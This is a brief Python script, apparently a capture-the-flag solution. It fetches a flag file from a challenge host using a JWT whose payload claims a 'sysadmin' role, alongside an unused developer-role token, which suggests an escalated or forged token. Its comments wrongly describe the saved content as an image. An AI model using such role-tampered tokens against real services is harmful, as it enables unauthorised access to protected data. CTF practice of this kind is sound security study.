import requests

# Endpoint URL
url = "https://share.comefindme.dev/static/1716012768999-flag.txt"

# JWT token
jwt_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAxLCJyb2xlIjoiZGV2ZWxvcGVyIiwiaWF0IjoxNzE2MDAzMjI0fQ.MzJyfqrJkvG2TJ9BpEu37ahfKCkGI5-NRB6_ykZuWbPCORIlUicOPaDBZwtKPmwgDJbGU4l_V_TwInHkleyVYKtz-oGN0zf8dH8NyKZbibKQCKPacvzioja4cxXNIbvyF_Q3weAA2TSJuYd0hqjW4W355VMOOfDXKs9VE6Rcrd7snjI8rnwraOJjt6lvU7EBc8DJJTNZYFTvmMx8CForioRIyn1LEz5l1ob-_LixY5_prbipzQgfSRx79o2befMucjl6cJHOBQJbOeh5x4V0XLDN4yaxH-bqPe1oYO2MAwyHVqMJ5WVomIOfxfN01rG0PtvSh8CsCoP66kxYa-ga2gyzGkAVhRiizco9uBpoARnrL7q1Tuylf0-kyxquSjs2vEG0UXU5FN3s8VYUUpANmJEf26RjEylNHWLS26AiFvxYZcwd4Zw9AbmAHsHKCedCaQ6o93SDmUnBK-UwFX0ldDusgoOpWVR5hApinhiig76DemP2yC_1dwoRk6xhQa-9LnpjpuElT4ivhlh1j-Fr3Yxm4RTQUc6oMPc7o6BGa5PBGKV4vPQH8NxAQyFv85u22fOMXBE-Jhlh1h2M2NMH_u8u3f5V2wU_471oyxRB8iLFdPwB7JNREcNwjPNzGyMCE6GEg2fDtunPOw7BnJH09FEqzB6tnejwDgUa4w3zybY"
sys_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAxLCJyb2xlIjoic3lzYWRtaW4iLCJpYXQiOjE3MTYwMDMyMjR9.hnHro31Nb4BSYeelFlkxcVAndqcIPu5D4SI7fv7hHdRggb4s-C7kV2iEsVrrQratqZbCjBXwLNfIBbiBodelw70T0dnbpAAEhPkqHL8RmGj76Ug3DwQhrbY0xwgMjJO44Xm43eOQYnz-UGKKMhhWGxuNU3kelbzf2SR7BSSJu5JV-zc-vmQRQx_ZNcZMpiyki3p_YRpQB2yK43FX32RouJzghG_m-c3ElOMeWQxMMr0XSC4yUYWyB3sngbRhtNQ7OhBYtYtT5XQPQb76M_KZ-xgrWtm3uf10sLUF9FZjIWVUvHvyHKCogAszCpam8G-MScy2V7OlYwUUZqEUrk-DIQrOfJnszluS49Vljnrs4k0bUr2wCfcLp_qWKxMSJ1ZzhcEO1k-dssvueoz8rsGtQ69kxaNCPJssPSzkqttsXEDBPqolhT8O-n62tjv0mXo2JqcfjC9mwzBZGEinthjz6PEPl0yv9bVX2KnbohqcylVNqPoG6wA8VU3bsbgNmg7ewotR2GH7-Puzfw0ihPYDCohC_ItGVx_Z_MSoHqYoB6j0wYICSqmgShvhW3rMDRbNiCBEcZO-wCAfYT1vlJ4OdDD87ZRkmrrrtz9-sN5phO35TCOYVTtuEM9lsntNpb6makOOiuRfGC_9duXxoi1f2IaVYUWHnndVM9DYTaRjNq8"


# Headers with Authorization
headers = {
    "Authorization": f"Bearer {sys_token}"
}

# Making GET request
response = requests.get(url, headers=headers)

# Check if the request was successful (status code 200)
if response.status_code == 200:
    print("Request successful.")
    # Save image to a file
    with open("jwt.key", "wb") as f:
        f.write(response.content)
    print("Image saved as 'jwt.key'")
else:
    print("Request failed with status code:", response.status_code)


#949780831